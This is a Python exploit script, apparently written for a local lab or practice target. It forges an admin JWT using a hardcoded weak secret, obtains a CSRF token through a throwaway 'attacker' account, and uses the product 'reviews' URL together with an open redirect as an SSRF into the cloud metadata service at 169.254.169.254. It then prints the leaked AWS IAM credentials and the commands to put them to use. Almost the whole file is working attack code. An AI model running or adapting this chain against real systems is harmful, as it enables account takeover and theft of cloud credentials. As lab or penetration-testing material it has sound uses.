#!/usr/bin/env python3
import sys
import json
import time
import jwt
import requests

BASE          = "http://localhost:8080"   
BASE_INTERNAL = "http://localhost:5000"  
JWT_SECRET    = "funkymonkey"            
ALGORITHM     = "HS256"


payload = {
    "sub": "admin",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 86400,
}
admin_token = jwt.encode(payload, JWT_SECRET, algorithm=ALGORITHM)
print(f"  Secret  : {JWT_SECRET!r}")
print(f"  Token   : {admin_token[:72]}...")

s = requests.Session()

r = s.post(f"{BASE}/api/auth/register",
           json={"username": "attacker_a", "email": "atk_a@pwned.io", "password": "aaaa"},
           timeout=5)
if r.status_code == 400:
    print("  (user exists, logging in instead)")
    r = s.post(f"{BASE}/api/auth/login",
               json={"username": "attacker_a", "password": "aaaa"},
               timeout=5)
if not r.ok:
    print(f"  [!] Could not obtain session: {r.status_code} {r.text}")
    sys.exit(1)

csrf = s.cookies.get("_csrf")
if not csrf:
    print(f"  [!] No _csrf cookie in response. Cookies: {dict(s.cookies)}")
    sys.exit(1)
print(f"  _csrf   : {csrf[:20]}...")


admin_cookies = {"token": admin_token, "_csrf": csrf}

ssrf_iam_list = f"{BASE_INTERNAL}/go?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

print(f"  reviews URL : {ssrf_iam_list}")
print("  Flow: create_product → urlopen(reviews) → /go 302 → 169.254.169.254")

r = requests.post(
    f"{BASE}/api/admin/create_product",
    json={"description": "test", "price": 1, "reviews": ssrf_iam_list},
    cookies=admin_cookies,
    headers={"X-CSRF-Token": csrf},
    timeout=10,
)

print(f"  Status  : {r.status_code}")
data = r.json()
print(f"  Response: {json.dumps(data, indent=4, ensure_ascii=False)}")

if "reviews" not in data:
    print("\n  [!] SSRF failed — check that docker-compose is running and aws-meta is healthy")
    sys.exit(1)

role_name = data["reviews"].strip()
print(f"\n  IAM role found: {role_name!r}")


print(f"Fetch credentials for role '{role_name}'")

ssrf_creds = f"{BASE_INTERNAL}/go?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"

r = requests.post(
    f"{BASE}/api/admin/create_product",
    json={"description": "test", "price": 1, "reviews": ssrf_creds},
    cookies=admin_cookies,
    headers={"X-CSRF-Token": csrf},
    timeout=10,
)

creds_raw = r.json().get("reviews", "{}")
try:
    creds = json.loads(creds_raw)
except Exception:
    creds = {"raw": creds_raw}

print(f"\n  {'='*50}")
print(f"  AWS CREDENTIALS LEAKED")
print(f"  {'='*50}")
for k, v in creds.items():
    print(f"  {k:<20}: {v}")
print(f"  {'='*50}")
print("\n  Next step: export vars and run any aws-cli command:")
print(f"    export AWS_ACCESS_KEY_ID={creds.get('AccessKeyId','?')}")
print(f"    export AWS_SECRET_ACCESS_KEY={creds.get('SecretAccessKey','?')}")
print(f"    export AWS_SESSION_TOKEN={creds.get('Token','?')}")
print(f"    aws sts get-caller-identity")
